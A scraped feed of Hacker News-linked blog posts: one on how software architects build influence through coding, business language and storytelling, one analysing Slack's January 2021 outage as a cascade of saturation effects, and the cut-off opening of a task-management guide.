<p>In 1933 the Navy rejected <a href="https://en.wikipedia.org/wiki/Draper_Kauffman">Draper Kauffman</a>
due to his poor eyesight.
Ten years later he trained the special units which would later become
<a href="https://en.wikipedia.org/wiki/United_States_Navy_SEALs">the SEALs</a>.
The training includes a grueling first week to filter out.
"Hell Week separated the men from the boys", Kauffman said.
"The men had sense enough to quit‚Äîleaving us with the boys!‚Äù</p>
<blockquote>
<p>In his program, everyone did the training, no matter their rank. This, of course, included Kauffman. The enlisted men of the first class took one look at their ungainly, nearsighted commander and reached the same conclusion; There was no way this guy would make it. But as the trainees watched, he proved them wrong.</p>
<p>"We were testing Kauffman all along," wrote Dan Dillon, a member of the first demolition class, "but my respect for him deepened because a lot of the officers will tell you what to do, but they won't do it themselves. This man asks for suggestions. If they're good, he uses them. And he participates in everything. The dirtiest, rottenest jobs that we tackle, he is in there doing as well as the rest of us. How could you not respect him?"
‚Äì<a href="http://beza1e1.tuxen.de/culture_code.html">The Culture Code</a></p>
</blockquote>
<p><img alt="Dirty Hands" src="http://beza1e1.tuxen.de/img/dirty_hands.jpg"></p>
<p>Kauffman is one of those leaders
who jump into the dirty trenches together with his team.
In his case literally during the second world war at the invasion of Japan.
Leaders who make their hands dirty gain "ethos", as Aristotle called it,
and so people care about their suggestions.</p>
<h2>Architects Must Code</h2>
<p>Software architects are technical leaders
but they have no budget and no command.
So an architect must work through persuasion and <a href="http://beza1e1.tuxen.de/influence.html">influence</a>.
However, do not pursue raw authority because
when a group makes decisions, they better discuss it as <em>equals</em>.
You want all information and experience on the table but
authority can silence valuable opinions.</p>
<p>Many developers tell me that architects must code like they do
otherwise they will not be aligned well.
The software architect should be a peer among developers to be trusted
and the most simple way is to the same work like Kauffman.
Write code, review pull requests, and debug issues.
When developers see that architects share their values like clean code,
it builds trust.</p>
<p>However, architects only have little time for coding.
At least, I work on a
<a href="http://paulgraham.com/makersschedule.html">manager schedule</a>
more than half the time.
So I avoid anything time critical
and invest extra effort that others can maintain my code as well.</p>
<h2>Speak Business with Managers</h2>
<p>Software developers are not the only ones
an architect will have to persuade.
There are all kinds of managers
(at least in embedded automotive projects):
Project managers, line managers,
safety managers, security managers,
requirements managers, and so on.
These people talk a different language
and the role for the software architect 
is to act as a translator here.</p>
<p>To a developer,
you can say "the code is a mess because everything is coupled together."
To a manager you rather need words like
"we should invest more in refactoring to reduce volatility in the marginal cost of features."
Instead of "devs are fed up with this mess and leave"
say "we can reduce our turnover by investing 10% of our time in our code quality."
<a href="https://understandlegacycode.com/blog/5-arguments-to-make-managers-care-about-technical-debt/">Nicolas Carlo wrote more about that</a>.
Maybe the examples are too extreme for your organisation
as <a href="https://ieeexplore.ieee.org/document/8094304">tech companies should have managers who are more technical</a>.</p>
<p>What happens if the gap between management and engineers widens
is well told in <a href="https://www.theatlantic.com/ideas/archive/2019/11/how-boeing-lost-its-bearings/602188/">this story about Boeing</a>.
The turning point of May 2001
looks like this for Boeing's stock price:</p>
<p><img alt="Boeing trend turns downwards at May 2001" src="http://beza1e1.tuxen.de/img/boeing_2001.png"></p>
<p>An example how different the views of management and developers can be
is documented in <a href="https://linkinghub.elsevier.com/retrieve/pii/S0164121299000941">a case study</a>
about the development of a medical instrument.
The project had a total cost overrun of 419% of the approved budget.
It took nearly twice as long as the approved plan.
Management considered the project a failure.
However, the developers considered it a success:</p>
<blockquote>
<p>In response to the question, what was the most successful project that you have worked on, and why, the researcher was surprised to find that over 50% (5/8) of the interviewed software developers identified Project A1! The other three interviewed software developers identified Project A1 as second best. The common theme on all the responses included (a) the project was a technical challenge, (b) the product worked the way it was intended to work, and (c) the team was small and high performing.</p>
</blockquote>
<p>Martin Fowler calls it
<a href="https://martinfowler.com/articles/value-architectural-attribute.html">the Elephant in the Architecture</a>.
Software architects are in between this tension
and the job is to find the proper tradeoff.</p>
<h2>Tell Stories</h2>
<p>Recently, I blogged a story at work.
It covered the last three years of my project
and the big lessons about big automotive projects I learned there.
The feedback was surprising.
Managers multiple levels above contacted me.
People who were starting other projects asked me for details.
My company documents lessons learned in every project as part of the usual process.
However, my story had wider influence.
Storytelling as a tool is underrated
and so I'm trying to learn it.</p>
<p>The meaning for "story" here is wide.
In a professional setting,
you will not spend an hour narrating gripping fiction.
This is about short stories like the three paragraphs at the beginning.
Some people might only call it "example".</p>
<blockquote>
<p>I would not call this storytelling. I would simply call it giving a relevant example.
‚Äì<a href="http://stevedenning.com/Storytelling-in-the-News/145-ft-discusses-storytelling.aspx">Lucy Kellaway</a></p>
</blockquote>
<p>However, there are no people who call themselves "example-givers"
but there are people who call themselves "story-tellers"
and their know-how is useful.</p>
<p>The most obvious difference is that stories are concrete unlike
<a href="http://beza1e1.tuxen.de/dependency_abstraction.html">abstract architectural diagrams</a>
and that <a href="http://beza1e1.tuxen.de/communicate_architecture.html">helps for communication</a>.
However, stories also work in more subtle ways.
Neuroscience shows that stories trigger mental simulations
that even affect the body.</p>
<blockquote>
<p>We can't imagine events or sequences without evoking the same modules of the brain that are evoked in real physical activity. Brain scans show that when people imagine a flashing light, they activate the visual area of the brain; when they imagine someone tapping on their skin, they activate tactile areas of the brain. The activity of mental simulation is not limited to the insides of our heads. People who imagine words that start with a 'b' or 'p' can't resist subtle lip movements, and people who imagine looking at the Eiffel Tower can't resist moving their eyes upward. Mental simulation can even alter visceral physical responses: When people drink water but imagine that it's lemon juice, they salivate more. Even more surprisingly, when people drink lemon juise but imagine it's water, they salivate less.
‚Äì<a href="http://beza1e1.tuxen.de/made_to_stick.html">Made to Stick</a></p>
</blockquote>
<p>There are different kinds of stories
depending on what you want people to care about.
Maybe you want to share some knowledge?
Maybe you want to inspire collaboration?
Maybe you want to introduce a new technology?
Maybe you want to emphasize cultural values?
Different use cases require different stories.
Sometimes the story must be true and sometimes it doesn't matter.
Sometimes plenty of details are helpful and sometimes not.
Fortunately, you don't have to be a great at telling stories.
Even a story which is not entertaining, dramatic, or funny will do its work.</p>
<p>As a first step,
my suggestion here is that you start collecting stories
(I have <a href="http://beza1e1.tuxen.de/tiddlywiki_notes.html">a note-taking system</a> for that)
and tell them.
If the outcome surprises you then tell me that story.</p>
<h2>Summary</h2>
<p>If you <a href="http://beza1e1.tuxen.de/communicate_architecture.html">communicate your architecture well</a>
but they ignore you anyways,
this article had three suggestions to increase your influence:</p>
<ol>
<li>Get your hands dirty in code to gain the trust of developers.</li>
<li>Learn the right language with managers.</li>
<li>Collect and tell more stories.</li>
</ol>
<p>More generically, the first two points can be merged
with Covey's 5th habit:
Seek first to understand, then to be understood.</p>
<hr>
<p>Dirty hands photo by <a href="https://unsplash.com/@alexjones">Alex Jones</a>
on <a href="https://unsplash.com/s/photos/dirty-work">Unsplash</a>.</p>

</article><p>Software architects must code, talk business, and tell stories. </p></div>]]>
            </description>
            <link>http://beza1e1.tuxen.de/architecture_care.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140202</guid>
            <pubDate>Mon, 15 Feb 2021 07:50:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Slack‚Äôs Jan 2021 outage: a tale of saturation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26140154">thread link</a>) | @vinnyglennon
<br/>
February 14, 2021 | https://surfingcomplexity.blog/2021/02/08/slacks-jan-2021-outage-a-tale-of-saturation/ | <a href="https://web.archive.org/web/*/https://surfingcomplexity.blog/2021/02/08/slacks-jan-2021-outage-a-tale-of-saturation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Laura Nolan of Slack recently published an excellent write-up of their <a href="https://slack.engineering/slacks-outage-on-january-4th-2021/">Jan. 4, 2021 outage</a> on Slack‚Äôs engineering blog.</p>



<p>One of the things that struck me about this writeup is the contributing factors that <em>aren‚Äôt</em> part of this outage. There‚Äôs nothing about a bug that somehow made its way into a production, or an accidentally incorrect configuration change, or how some corrupt data ended up in the database. On the other hand, it‚Äôs an outage story with multiple examples of <strong><em>saturation</em></strong>.</p>



<p><em>Saturation </em>is a phrase often used by the safety science researcher David Woods: it refers to a system that is reaching the limit of what it can handle. If you‚Äôve done software operations work, I bet you‚Äôve encountered resource exhaustion, which is an example of saturation.</p>



<p>Saturation plays a big role in Woods‚Äôs model of the adaptive universe. In particular, in socio-technical systems, people will adapt in order to reduce the risk of saturation. In this post, I‚Äôm going to walk Laura‚Äôs write-up, highlighting all of the examples of saturation and how the system adopted to it. I‚Äôm going purely from the text of the original write-up, which means I‚Äôll likely get some things wrong here.</p>



<p>Slack runs their infrastructure on AWS. In the beginning, they (like, I presume, all small companies) started with a single AWS account. And, initially, this worked out well.</p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg"><img data-attachment-id="1770" data-permalink="https://surfingcomplexity.blog/happy-cloud-1/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg" data-orig-size="623,432" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="happy-cloud-1" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg?w=623" src="https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg?w=623" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg 623w, https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/happy-cloud-1.jpg?w=300 300w" sizes="(max-width: 623px) 100vw, 623px"></a><figcaption>In the beginning, Slack‚Äôs AWS footprint fit nicely into one account and VPC: that‚Äôs one happy cloud!</figcaption></figure>



<p>However, as Slack grew, it encountered it problems. Here‚Äôs a quote from Slack‚Äôs blog post <a href="https://slack.engineering/building-the-next-evolution-of-cloud-networks-at-slack/">Building the Next Evolution of Cloud Networks at Slack</a> by Archie Gunasekara:</p>



<p><em>As our customer base grew and the tool evolved, we developed more services and built more infrastructure as needed. However, everything we built still lived in one big AWS account. This is when our troubles started. Having all our infrastructure in a single AWS account led to AWS rate-limiting issues, cost-separation issues, and general confusion for our internal engineering service teams.</em></p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg"><img data-attachment-id="1772" data-permalink="https://surfingcomplexity.blog/sad-coud/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg" data-orig-size="933,767" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="sad-coud" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg?w=933" src="https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg?w=933" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg 933w, https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/02/sad-coud.jpg?w=768 768w" sizes="(max-width: 933px) 100vw, 933px"></a><figcaption>That cloud isn‚Äôt looking so happy anymore</figcaption></figure>



<p>The above quote makes reference to three different categories of saturation. The first is a traditional sort of limit we software folks think of: they were running into AWS rate limits associated with an individual AWS account.</p>



<p>The other two limits are cognitive: the system made it harder for humans to deal with separating out costs and, it led to confusion for internal teams. I still see these as a form of saturation: as a system gets more difficult for humans to deal with, it effectively increases the cost of using the system, and it makes errors more likely. </p>



<p>And so, the Slack Cloud Engineering team adapted to meet this saturation risk by adopting AWS child accounts. From the linked blog post again:</p>



<p><em>Now the service teams could request their own AWS accounts and could even peer their VPCs with each other when services needed to talk to other services that lived in a different AWS account. </em></p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg"><img data-attachment-id="1774" data-permalink="https://surfingcomplexity.blog/multiple-child-accounts/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg" data-orig-size="924,688" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="multiple-child-accounts" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg?w=924" src="https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg?w=924" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg 924w, https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/02/multiple-child-accounts.jpg?w=768 768w" sizes="(max-width: 924px) 100vw, 924px"></a><figcaption>Multiple happy child accounts</figcaption></figure>



<p>With continued growth, they eventually reached saturation again. Once again, this was the ‚Äúit‚Äôs getting too hard‚Äù sort of saturation:</p>



<p><em>Having hundreds of AWS accounts became a nightmare to manage when it came to CIDR ranges and IP spaces, because the mis-management of CIDR ranges meant that we couldn‚Äôt peer VPCs with overlapping CIDR ranges. This led to a lot of administrative overhead.</em></p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg"><img data-attachment-id="1778" data-permalink="https://surfingcomplexity.blog/cant-peer-1/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg" data-orig-size="992,692" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="cant-peer-1" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg?w=992" src="https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg?w=992" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg 992w, https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/02/cant-peer-1.jpg?w=768 768w" sizes="(max-width: 992px) 100vw, 992px"></a><figcaption>VPC peering with multiple VPCs increases the cognitive load on the networking engineers</figcaption></figure>



<p>To deal with this risk of saturation, the cloud engineering team adapted again. They reached for new capabilities: AWS shared VPCs and AWS Transit Gateway Inter-Region Peering. By leveraging these technologies, they were able to design a network architecture that addressed their problems:</p>



<p><em>This solved our earlier issue of constantly hitting AWS rate limits due to having all our resources in one AWS account. This approach seemed really attractive to our Cloud Engineering team, as we could manage the IP space, build VPCs, and share them with our child account owners. Then, without having to worry about managing any of the overhead of setting up VPCs, route tables, or network access lists, teams were able to utilize these VPCs and build their resources on top of them.</em></p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg"><img data-attachment-id="1780" data-permalink="https://surfingcomplexity.blog/tgw-1/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg" data-orig-size="998,637" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="tgw-1" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg?w=998" src="https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg?w=998" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg 998w, https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/02/tgw-1.jpg?w=768 768w" sizes="(max-width: 998px) 100vw, 998px"></a><figcaption>Example of a transit gateway connecting multiple VPCs. Obviously, this does not accurately depict Slack‚Äôs actual network architecture. </figcaption></figure>



<p>Fast forward several months later. From Laura Nolan‚Äôs post:</p>



<p><em>On January 4th, one of our Transit Gateways became overloaded. The TGWs are managed by AWS and are intended to scale transparently to us. However, Slack‚Äôs annual traffic pattern is a little unusual: Traffic is lower over the holidays, as everyone disconnects from work (good job on the work-life balance, Slack users!). On the first Monday back, client caches are cold and clients pull down more data than usual on their first connection to Slack. We go from our quietest time of the whole year to one of our biggest days quite literally overnight. Our own serving systems scale quickly to meet these kinds of peaks in demand (and have always done so successfully after the holidays in previous years). However, our TGWs did not scale fast enough.</em></p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg"><img loading="lazy" data-attachment-id="1782" data-permalink="https://surfingcomplexity.blog/lotsa-traffic/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg" data-orig-size="1111,558" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="lotsa-traffic" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg?w=1024" src="https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg?w=1024" alt="" width="770" height="386" srcset="https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg?w=1024 1024w, https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg?w=770 770w, https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/02/lotsa-traffic.jpg 1111w" sizes="(max-width: 770px) 100vw, 770px"></a><figcaption>Traffic surge overwhelms the transit gateway</figcaption></figure>



<p>This is as clear an example of saturation as you can get: the incoming load increased faster than the transit gateways were able to cope. What‚Äôs really fascinating from this point on is the role that saturation plays in interactions with the rest of the system.</p>



<p>As too many of us know, clients experience a saturated network as an increase in latency. When network latency goes up, the threads in a service spend more of their time sitting there waiting for the bits to come over the network, which means that CPU utilization goes down.</p>



<p>Slack‚Äôs web tier autoscales on CPU utilization, so when the network started dropping packets, the instances in the web tier spent more of their time blocked, and CPU went down, which triggered the AWS autoscaler to downscale the web tier. </p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg"><img data-attachment-id="1784" data-permalink="https://surfingcomplexity.blog/server-waiting/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg" data-orig-size="619,548" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="server-waiting" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg?w=619" src="https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg?w=619" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg 619w, https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/server-waiting.jpg?w=300 300w" sizes="(max-width: 619px) 100vw, 619px"></a><figcaption>A server‚Äôs CPU utilization falls as it waits for packets that are being dropped by the overloaded transit gateway</figcaption></figure>



<p>However, the web tier has a scaling policy that rapidly upscales if thread utilization gets too high. (At Netflix, we use the term <em>hammer rule</em> to describe these type of emergency scale-up rule). </p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg"><img data-attachment-id="1786" data-permalink="https://surfingcomplexity.blog/hammer/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg" data-orig-size="999,586" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="hammer" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg?w=999" src="https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg?w=999" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg 999w, https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/02/hammer.jpg?w=768 768w" sizes="(max-width: 999px) 100vw, 999px"></a><figcaption>Too many threads are in use, waiting for those packets. Time for the scale-up hammer! </figcaption></figure>



<p>Once the new instances come online, an internal Slack service named <em>provision-service</em> is responsible for setting up these new instances so that they can serve traffic. And here, we see more saturation issues (emphasis mine).</p>



<p><em>Provision-service needs to talk to other internal Slack systems and to some AWS APIs. It was communicating with those dependencies over the same degraded network, and like most of Slack‚Äôs systems at the time, it was seeing longer connection and response times, and therefore was using more system resources than usual. The spike of load from the simultaneous provisioning of so many instances under suboptimal network conditions meant that provision-service hit two separate resource bottlenecks (the most significant one was the <strong>Linux open files limit</strong>, but we also exceeded an <strong>AWS quota limit</strong>).</em></p>



<p><em>While we were repairing provision-service, we were still under-capacity for our web tier because the scale-up was not working as expected. We had created a large number of instances, but most of them were not fully provisioned and were not serving. The large number of broken instances caused us to hit our <strong>pre-configured autoscaling-group size limits</strong>, which determine the maximum number of instances in our web tier.</em></p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg"><img data-attachment-id="1789" data-permalink="https://surfingcomplexity.blog/provision-service-1/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg" data-orig-size="1057,836" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="provision-service-1" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg?w=1024" src="https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg?w=1024" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg?w=1024 1024w, https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg?w=768 768w, https://lorinhochstein.files.wordpress.com/2021/02/provision-service-1.jpg 1057w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>The provision service is saturated, as is the autoscaling group, although many of the instances aren‚Äôt serving traffic because they aren‚Äôt fully provisioned.</figcaption></figure>



<p>Through a combination of robustness mechanisms (load balancer panic mode, retries, circuit breakers) and the actions of human operators, the system is restored to health. </p>



<p>As operators, we strive to keep our systems far from the point of saturation. As a consequence, we generally don‚Äôt have much experience with how the system behaves as it approaches saturation. And that makes these incidents much harder to deal with. </p>



<p>Making things worse, we can‚Äôt ever escape the risk of saturation. Often we won‚Äôt know that a limit exists until the system breaches it.</p>
	</div></div>]]>
            </description>
            <link>https://surfingcomplexity.blog/2021/02/08/slacks-jan-2021-outage-a-tale-of-saturation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140154</guid>
            <pubDate>Mon, 15 Feb 2021 07:40:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to best manage your tasks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26140123">thread link</a>) | @jonmal
<br/>
February 14, 2021 | https://blog.doit.io/task-management/ | <a href="https://web.archive.org/web/*/https://blog.doit.io/task-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

           <!-- 
            <figure class="post-full-image">
                <img
                    srcset="/content/images/size/w300/2021/02/TaskManagement-1.jpg 300w,
                            /content/images/size/w600/2021/02/TaskManagement-1.jpg 600w,
                            /content/images/size/w1000/2021/02/TaskManagement-1.jpg 1000w,
                            /content/images/size/w2000/2021/02/TaskManagement-1.jpg 2000w"
                    sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px"
                    src="/content/images/size/w600/2021/02/TaskManagement-1.jpg"
                    alt="Task Management: How to Best Manage your Tasks"
                />
            </figure>
            -->

            <section>
                <div>
                    <p>Daily life is busy and getting busier every single day. Keeping up with it all can feel overwhelming at best and impossible at worst. We could all use some help organizing the various projects and associated deadlines we have at work, school, and home. </p><p>The key to meeting deadlines and staying on track to complete projects is effective task management.</p><p>Think about it. Projects are really just a set of tasks that need to be completed, one after another, until the project is done. Task management can help you stay on track, focus your efforts, and stop missing deadlines, big and small.</p><figure><img src="https://blog.doit.io/content/images/2021/02/TaskManagement.jpg" alt="" srcset="https://blog.doit.io/content/images/size/w600/2021/02/TaskManagement.jpg 600w, https://blog.doit.io/content/images/size/w1000/2021/02/TaskManagement.jpg 1000w, https://blog.doit.io/content/images/2021/02/TaskManagement.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>Task Management</figcaption></figure><p>In this guide we will explain task management, share the skills you need to have to be a taskmaster, outline specific methods for approaching task management, and discuss how task management software can help.</p><p>Let‚Äôs do it.</p><ol><li><a href="#what-is-task-management?">What is Task Management?</a></li><li><a href="#5-essential-skills-for-effective-task-management">5 Essential skills for Effective Task Management</a></li><li><a href="#methods-to-use-for-task-management">Methods to use for Task Managements</a></li><li><a href="#why-should-you-use-task-management-software">Why you should use Task Management Software</a></li><li><a href="#key-features-of-the-best-task-management-software">Key features of Best Task Management 